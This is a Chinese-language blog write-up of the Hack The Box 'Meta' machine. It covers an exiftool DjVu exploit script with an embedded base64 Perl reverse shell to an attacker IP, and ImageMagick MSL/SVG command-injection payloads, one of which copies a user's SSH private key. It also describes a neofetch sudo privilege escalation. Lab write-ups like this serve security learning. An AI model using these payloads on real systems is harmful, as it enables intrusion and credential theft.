---
title: Meta
date: 2022-02-28 18:03:59
tags: Hack The box
categories: 文件上传漏洞
---

## 信息收集
发现目标主机只开放了ssh和web服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/e44de3ff9ec249158e313f30d95c73ee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
当我们访问web主页时，发现只是一个很普通的apache搭建的页面
![在这里插入图片描述](https://img-blog.csdnimg.cn/5faebd3ecae84cfcb3b00eacdf9fdfc5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

目录扫描貌似好像也没发现什么有价值的信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/1e7e687ac113488b8fb14fa19ed5a61d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

什么发现也没有，当我们扫描子域名时，发现了一个子域
![在这里插入图片描述](https://img-blog.csdnimg.cn/1314b6048efc42bca44cf2435e76decf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
当我们访问这个子域时，发现是一个文件上传的点。经过反复测试，初步断定它对上传内容进行了仔细的检查，任何不符合图片特征的文件都会被过滤掉
![在这里插入图片描述](https://img-blog.csdnimg.cn/22c1b5eabb3e4ce09a79adbcb78671b9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那我们尝试上传一张正常的图片试试，这个格式是否很眼熟？对的，这是exiftool工具的输出格式
![在这里插入图片描述](https://img-blog.csdnimg.cn/2eeabd15c6a041ff8ac20e97e9fac527.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/63c038ce761e41d3b3cc235f3354e1b6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

## 漏洞利用
说实话这里是我自己本人没想到，可能是我自己的经验不太够吧。这里我们要找的是exiftool对应的漏洞，对的没想到吧，我也是参考了别人的意见才知道的。这里已经披露出了对应的漏洞编号了
![在这里插入图片描述](https://img-blog.csdnimg.cn/79945371d22b48d38a108e4b60f39dbb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我选择了第二个网址上的漏洞利用脚本，因为上面那个依赖问题太复杂了。首先我们先生成一个图片马文件，将脚本文件的IP和监听端口改成我们对应的IP和端口

```python
#!/bin/env python3

import base64
import subprocess

ip = '10.10.14.60'
port = '4444'

payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"


payload = payload + base64.b64encode( f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};".encode() )

payload = payload + b"'))};\")"


payload_file = open('payload', 'w')
payload_file.write(payload.decode('utf-8'))
payload_file.close()


subprocess.run(['bzz', 'payload', 'payload.bzz'])
subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'image.jpg']) 

```
![在这里插入图片描述](https://img-blog.csdnimg.cn/fac6e927ad1940cc90f1a379e3b299c5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
上传image.jpg木马图片后，我们得到了www-data用户的权限
![在这里插入图片描述](https://img-blog.csdnimg.cn/9380c7ea757846259f3151ada423caf7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
但是当我们进入thomas用户的`.ssh`目录时，发现没有权限，并且user.txt文件也没有权限查看
![在这里插入图片描述](https://img-blog.csdnimg.cn/7888820403bb4a8382561e6bd9c30d71.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
查看主机的内核版本，发现是64位的Linux主机
![在这里插入图片描述](https://img-blog.csdnimg.cn/cb52633575a546c2817023ca0d7b04b1.png)
我们可以尝试上传pspy64这个脚本进行探测，pspy 是一个命令行工具，旨在侦听进程而无需 root 权限。它允许您在执行时查看其他用户、cron 作业等运行的命令。发现了一个`convert_images.sh`脚本
![在这里插入图片描述](https://img-blog.csdnimg.cn/062aec9a84b14b5190b0501765926e0e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们查看一下这个脚本的内容，发现它是先进入到对应的目录中，然后再运行mogrify这个程序将发现的文件转换为png文件，最后杀死这个进程。
![在这里插入图片描述](https://img-blog.csdnimg.cn/ac6aaed6b8334939a293bfd860e98975.png)
我们可以查看一下mogrify这个程序的版本，发现是`7.0.10-36`
![在这里插入图片描述](https://img-blog.csdnimg.cn/073f7d8415794159b62d0729a8c746f0.png)
在网上搜索到对应的漏洞编号是`CVE-2016-3714`
![在这里插入图片描述](https://img-blog.csdnimg.cn/3b8c9945b1b34bdcb9bf0ab65d8dc735.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
利用的方法是上传一个poc.svg文件到`/dev/shm`目录下，并将poc.svg文件复制到`/var/www/dev01.artcorp.htb/convert_images/`这个目录下，经过一段时间后会生成一个0wned文件，输出了用户名证明文件成功执行了包含的命令

```xml
<image authenticate='ff" `echo $(id)> /dev/shm/0wned`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/4c3e86599bf44cfc96a8a44f7ec80ac1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那我们修改一下poc.svg里面的内容，尝试将`thomas`账户的密钥文件读取出来

```xml
<image authenticate='ff" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```
成功读取密钥信息，我们可以开启一个http服务将id_rsa文件下载下来
![在这里插入图片描述](https://img-blog.csdnimg.cn/1e6d846d9e1f4541bfd05772e96373d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
重新编排一下顺序后，可以成功连接到thomas用户
![在这里插入图片描述](https://img-blog.csdnimg.cn/d92c5bb5b20846719f1eb0a4e5c57592.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 提权到ROOT
我们输入`sudo -l`命令，发现一个`neofetch`程序可以以root身份运行
![在这里插入图片描述](https://img-blog.csdnimg.cn/5e89769e71c5441f821d397997cab9ee.png)
我们尝试运行这个程序，输出是linux内核的基本信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/4e51200b476d4973853ae1f498c63e2b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
既然这个程序可以利用，那么我们可以进入这个程序的配置文件中，更改其配置文件信息达到我们提权的目的。我们更改`/home/thomas/.config/neofetch`这个目录下的config.conf文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/7383f86d421b435a81e6f2e51b8a4e7b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
因为我们使用neofetch程序提权的时候，会保留XDG_CONFIG_HOME的环境变量，所以我们要将thomas.config导出到基本配置环境路径
![在这里插入图片描述](https://img-blog.csdnimg.cn/a0cb500158324ae88c35eb1c1f8d319f.png)
得到root权限
![在这里插入图片描述](https://img-blog.csdnimg.cn/f40946dc24a94472b51143eaebc4fbff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 总结
总的来说，这个靶机还是相当有难度的。我后面提权部分基本也是照着别人的建议来做，真的实在是太难了。提权和漏洞利用的方法都是在红队攻防实战中非常常见的，能掌握对技术提升方面很有帮助。
